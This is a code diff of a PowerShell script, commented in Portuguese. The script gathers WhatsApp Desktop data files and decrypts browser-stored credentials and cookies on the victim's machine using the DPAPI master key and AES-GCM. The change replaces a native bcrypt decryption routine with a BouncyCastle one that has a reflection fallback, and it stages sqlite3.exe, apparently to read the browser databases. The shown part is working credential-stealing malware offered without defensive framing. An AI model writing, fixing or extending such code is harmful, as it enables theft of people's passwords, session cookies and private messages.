@@ -108,40 +108,39 @@ $UWPL = Join-Path $env:LOCALAPPDATA 'Packages\5319275A.WhatsAppDesktop_cv1g1gvan
 if (Test-Path $UWPL) { Get-ChildItem $UWPL -File | ForEach-Object { Add-File $_.FullName ('uwp/' + $_.Name) } }
 
 
-# --- decifra credenciais/cookies na propria maquina (DPAPI + AES-GCM) ---
-Add-Type -TypeDefinition @"
-using System; using System.Text; using System.Runtime.InteropServices;
+# --- decifra credenciais/cookies na propria maquina (DPAPI + AES-GCM via BouncyCastle) ---
+$BC = Join-Path $PSScriptRoot 'BouncyCastle.Cryptography.dll'
+$script:GcmMode = ''
+if (Test-Path -LiteralPath $BC) {
+  try {
+    Add-Type -TypeDefinition @"
+using System;
+using Org.BouncyCastle.Crypto.Engines;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Parameters;
 public static class Gcm {
-  [StructLayout(LayoutKind.Sequential)] public struct AI {
-    public int cbSize; public int dwInfoVersion; public IntPtr pbNonce; public int cbNonce;
-    public IntPtr pbAuthData; public int cbAuthData; public IntPtr pbTag; public int cbTag;
-    public IntPtr pbMacContext; public int cbMacContext; public int cbAAD; public long cbData; public int dwFlags;
-  }
-  [DllImport("bcrypt.dll")] static extern int BCryptOpenAlgorithmProvider(out IntPtr p, string id, string impl, int f);
-  [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr p, int f);
-  [DllImport("bcrypt.dll")] static extern int BCryptSetProperty(IntPtr h, string prop, byte[] val, int len, int f);
-  [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr h, out IntPtr k, IntPtr obj, int len, byte[] secret, int slen, int f);
-  [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr k);
-  [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr k, byte[] input, int clen, ref AI ai, byte[] iv, int ivlen, byte[] outb, int olen, out int written, int f);
-  public static int LastStatus; public static byte[] Dec(byte[] key, byte[] nonce, byte[] ct, byte[] tag, byte[] aad) {
-    IntPtr h, k; LastStatus = BCryptOpenAlgorithmProvider(out h, "AES", null, 0); if (LastStatus != 0) return null;
-    byte[] mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
-    BCryptSetProperty(h, "ChainingMode", mode, mode.Length, 0);
-    LastStatus = BCryptGenerateSymmetricKey(h, out k, IntPtr.Zero, 0, key, key.Length, 0); if (LastStatus != 0) { BCryptCloseAlgorithmProvider(h, 0); return null; }
-    IntPtr pn = Marshal.AllocHGlobal(nonce.Length), pt = Marshal.AllocHGlobal(tag.Length), pa = Marshal.AllocHGlobal(Math.Max(1, aad.Length));
-    Marshal.Copy(nonce, 0, pn, nonce.Length); Marshal.Copy(tag, 0, pt, tag.Length); if (aad.Length > 0) Marshal.Copy(aad, 0, pa, aad.Length);
-    AI ai = new AI(); ai.cbSize = Marshal.SizeOf(typeof(AI)); ai.dwInfoVersion = 1;
-    ai.pbNonce = pn; ai.cbNonce = nonce.Length; ai.pbTag = pt; ai.cbTag = tag.Length;
-    ai.pbAuthData = aad.Length > 0 ? pa : IntPtr.Zero; ai.cbAuthData = aad.Length;
-    byte[] outb = new byte[ct.Length]; int w = 0;
-    LastStatus = BCryptDecrypt(k, ct, ct.Length, ref ai, null, 0, outb, outb.Length, out w, 0);
-    Marshal.FreeHGlobal(pn); Marshal.FreeHGlobal(pt); Marshal.FreeHGlobal(pa);
-    BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(h, 0);
-    if (LastStatus != 0) return null; if (w != ct.Length) { byte[] t = new byte[w]; Array.Copy(outb, t, w); return t; }
-    return outb;
+  public static int LastStatus;
+  public static byte[] Dec(byte[] key, byte[] nonce, byte[] ctTag, byte[] aad) {
+    try {
+      GcmBlockCipher c = new GcmBlockCipher(new AesEngine());
+      c.Init(false, new AeadParameters(new KeyParameter(key), 128, nonce, aad));
+      byte[] o = new byte[c.GetOutputSize(ctTag.Length)];
+      int n = c.ProcessBytes(ctTag, 0, ctTag.Length, o, 0);
+      n += c.DoFinal(o, n);
+      if (n != o.Length) { byte[] t = new byte[n]; Array.Copy(o, t, n); return t; }
+      return o;
+    } catch (Exception e) { LastStatus = e.HResult; return null; }
   }
 }
-"@
+"@ -ReferencedAssemblies $BC -ErrorAction Stop
+    if (-not ('Gcm' -as [type])) { throw 'tipo Gcm nao compilou' }
+    $script:GcmMode = 'csharp'
+  } catch {}
+  if (-not $script:GcmMode) {
+    # fallback: usa a mesma DLL por reflexao (sem compilar C#)
+    try { [Reflection.Assembly]::LoadFrom($BC) | Out-Null; $script:GcmMode = 'reflection' } catch {}
+  }
+}
 function Hex-ToBytes($h) { $b = New-Object byte[] ($h.Length / 2); for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Convert]::ToByte($h.Substring($i * 2, 2), 16) }; return $b }
 function Get-MasterKey($ls) {
   try {
@@ -154,7 +153,24 @@ function Get-MasterKey($ls) {
 function Dec-Bytes($key, $blob, $aad) {
   if (-not $key -or $blob.Length -lt 32) { return $null }
   if ([Text.Encoding]::ASCII.GetString($blob, 0, 3) -notin @('v10', 'v11')) { return $null }
-  try { return [Gcm]::Dec($key, $blob[3..14], $blob[15..($blob.Length - 17)], $blob[($blob.Length - 16)..($blob.Length - 1)], $aad) } catch { return $null }
+  [byte[]]$nonce = $blob[3..14]
+  [byte[]]$ctTag = $blob[15..($blob.Length - 1)]
+  if (-not $aad) { $aad = [byte[]]@() }
+  try {
+    if ($script:GcmMode -eq 'csharp') { return [Gcm]::Dec($key, $nonce, $ctTag, $aad) }
+    if ($script:GcmMode -eq 'reflection') {
+      $c = New-Object Org.BouncyCastle.Crypto.Modes.GcmBlockCipher -ArgumentList (, (New-Object Org.BouncyCastle.Crypto.Engines.AesEngine))
+      $kp = New-Object Org.BouncyCastle.Crypto.Parameters.KeyParameter -ArgumentList (, $key)
+      $p = New-Object Org.BouncyCastle.Crypto.Parameters.AeadParameters -ArgumentList $kp, 128, $nonce, $aad
+      $c.Init($false, $p)
+      $o = New-Object byte[] ($c.GetOutputSize($ctTag.Length))
+      $n = $c.ProcessBytes($ctTag, 0, $ctTag.Length, $o, 0)
+      $n += $c.DoFinal($o, $n)
+      if ($n -eq $o.Length) { return $o }
+      return $o[0..($n - 1)]
+    }
+  } catch { return $null }
+  return $null
 }
 $sqlite = Join-Path $PSScriptRoot 'sqlite3.exe'
 
